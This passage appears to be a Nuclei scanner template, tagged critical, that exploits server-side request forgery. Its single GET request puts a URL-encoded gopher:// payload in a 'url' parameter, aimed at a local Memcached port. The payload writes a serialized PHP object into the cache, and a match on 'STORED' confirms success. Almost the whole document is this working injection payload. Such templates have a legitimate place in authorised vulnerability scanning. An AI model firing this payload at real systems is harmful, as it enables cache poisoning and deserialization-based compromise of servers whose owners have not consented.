  author: jakelo-ai
  severity: critical
  description: Exploit SSRF to inject serialized PHP objects into Memcached.
  tags: ssrf,gopher,memcached,php,deserialization,custom

http:
  - method: GET
    path:
      - "{{BaseURL}}/?url=gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%2014%0d%0aO%3A5%3A%22Hello%22%3A0%3A%7B%7D%0d%0a"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "STORED"
